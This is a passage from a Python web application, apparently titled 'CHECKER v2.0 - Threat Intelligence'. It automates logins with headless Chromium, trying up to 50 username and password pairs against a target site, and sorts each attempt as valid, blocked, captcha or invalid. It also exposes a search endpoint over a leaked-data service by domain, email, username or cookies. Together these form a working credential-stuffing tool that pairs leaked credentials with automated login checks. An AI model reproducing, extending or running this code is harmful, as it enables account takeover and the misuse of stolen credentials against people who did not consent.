                if element and await element.is_visible():
                    return selector
            except:
                pass
        
        return None
    
    async def analyze_response(page, error_keywords, blocked_keywords, captcha_keywords):
        """Analizar HTML y URL para detectar estado de login"""
        try:
            url_lower = page.url.lower()
            html = await page.content()
            html_lower = html.lower()
            
            # Detectar CAPTCHA
            for keyword in captcha_keywords:
                if keyword in html_lower or keyword in url_lower:
                    return "captcha"
            
            # Detectar bloqueado
            for keyword in blocked_keywords:
                if keyword in html_lower or keyword in url_lower:
                    return "blocked"
            
            # Detectar error/inválido
            for keyword in error_keywords:
                if keyword in html_lower or keyword in url_lower:
                    return "invalid"
            
            # Si no hay errores, probablemente es válido
            return "valid"
        except:
            return "unknown"
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            
            # Procesar hasta 50 credenciales
            for idx, cred in enumerate(credentials[:50]):
                response_state = "unknown"
                response_time = 0
                error_msg = None
                
                try:
                    page = await browser.new_page(viewport={"width": 1280, "height": 720})
                    
                    # Timeout global de 45 segundos
                    start_time = __import__('time').time()
                    
                    # Acceder a URL
                    try:
                        await page.goto(url, wait_until="domcontentloaded", timeout=15000)
                    except Exception as e:
                        await page.close()
                        results.append({
                            "username": cred.get("username", ""),
                            "password": cred.get("password", ""),
                            "valid": False,
                            "state": "offline",
                            "response_time": int((__import__('time').time() - start_time) * 1000),
                            "error": "Sitio no accesible o timeout"
                        })
                        continue
                    
                    # Buscar campos de entrada
                    user_selector = await find_input_field(page, username_field, "username")
                    pass_selector = await find_input_field(page, password_field, "password")
                    
                    if not user_selector or not pass_selector:
                        await page.close()
                        results.append({
                            "username": cred.get("username", ""),
                            "password": cred.get("password", ""),
                            "valid": False,
                            "state": "not_found",
                            "response_time": int((__import__('time').time() - start_time) * 1000),
                            "error": "Campos de entrada no detectados"
                        })
                        continue
                    
                    # Llenar campos
                    await page.fill(user_selector, cred.get("username", ""))
                    await page.wait_for_timeout(300)  # Pequeña pausa para validación en tiempo real
                    await page.fill(pass_selector, cred.get("password", ""))
                    
                    # Enviar formulario
                    submit_clicked = False
                    try:
                        # Intentar múltiples selectores de submit
                        submit_selectors = [
                            "button[type='submit']",
                            "button[name='submit']",
                            "input[type='submit']",
                            "button:has-text('Login')",
                            "button:has-text('Sign In')",
                            "button:has-text('Enter')"
                        ]
                        
                        for submit_selector in submit_selectors:
                            try:
                                button = await page.query_selector(submit_selector)
                                if button and await button.is_visible():
                                    await button.click()
                                    submit_clicked = True
                                    break
                            except:
                                pass
                        
                        if not submit_clicked:
                            # Última opción: presionar Enter
                            await page.press(pass_selector, "Enter")
                            submit_clicked = True
                    except:
                        pass
                    
                    # Esperar navegación o cambios en página
                    try:
                        await page.wait_for_navigation(timeout=10000)
                    except:
                        await page.wait_for_timeout(3000)
                    
                    # Analizar respuesta
                    response_state = await analyze_response(page, ERROR_KEYWORDS, BLOCKED_KEYWORDS, CAPTCHA_KEYWORDS)
                    
                    is_valid = response_state == "valid"
                    if is_valid:
                        valid_count += 1
                    elif response_state == "blocked":
                        blocked_count += 1
                    
                    response_time = int((__import__('time').time() - start_time) * 1000)
                    
                    results.append({
                        "username": cred.get("username", ""),
                        "password": cred.get("password", ""),
                        "valid": is_valid,
                        "state": response_state,
                        "response_time": response_time,
                        "url_final": page.url
                    })
                    
                    await page.close()
                    
                except Exception as e:
                    response_time = int((__import__('time').time() - start_time) * 1000)
                    results.append({
                        "username": cred.get("username", ""),
                        "password": cred.get("password", ""),
                        "valid": False,
                        "state": "error",
                        "response_time": response_time,
                        "error": str(e)[:60]
                    })
            
            await browser.close()
    
    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "total": 0,
            "valid": 0,
            "invalid": 0,
            "blocked": 0,
            "results": []
        }
    
    return {
        "status": "ok",
        "total": len(results),
        "valid": valid_count,
        "invalid": len(results) - valid_count - blocked_count,
        "blocked": blocked_count,
        "results": results
    }

@app.get("/api/simple-search")
async def simple_search(field: str, query: str, offset: int = 0, limit: int = 20):
    """
    Búsqueda SIMPLE - Leaksyr API con paginación eficiente
    Solo trae los resultados necesarios para la página actual
    NO carga todo en memoria - pagina bajo demanda
    """
    if not leaksyr_client or not field or not query:
        return {"status": "error", "data": [], "total": 0, "has_more": False}
    
    try:
        # Usar Leaksyr Client directamente (sin HTTP interno)
        if field == "domain":
            response = leaksyr_client.search_domain(
                domain=query,
                match_mode="family",
                limit=limit,
                offset=offset
            )
        elif field == "email":
            response = leaksyr_client.search_email(
                email=query,
                limit=limit,
                offset=offset
            )
        elif field == "username":
            response = leaksyr_client.search_username(
                username=query,
                limit=limit,
                offset=offset
            )
        elif field == "cookies":
            # Para cookies, usar domain search
            response = leaksyr_client.search_domain(
                domain=query,
                match_mode="family",
                limit=limit,
                offset=offset
            )
        else:
            return {"status": "error", "data": [], "total": 0, "has_more": False}
        
        records = response.data
        has_more = response.meta.has_more
        total = response.meta.count
        
        print(f"[SIMPLE-SEARCH] field={field}, query={query}, offset={offset}, limit={limit}, total={total}, has_more={has_more}, returning={len(records)}")
        
        return {
            "status": "ok",
            "field": field,
            "query": query,
            "total": total,
            "offset": offset,
            "limit": limit,
            "has_more": has_more,
            "data": records
        }
    except Exception as e:
        print(f"[SIMPLE-SEARCH] Error: {e}")
        return {"status": "error", "data": [], "total": 0, "has_more": False, "error": str(e)[:100]}

if __name__ == "__main__":
    import uvicorn
    print("="*60)
    print("CHECKER v2.0 - Threat Intelligence")
    print("Open: http://localhost:8000")
    print("="*60)
    uvicorn.run(app, host="127.0.0.1", port=8000)
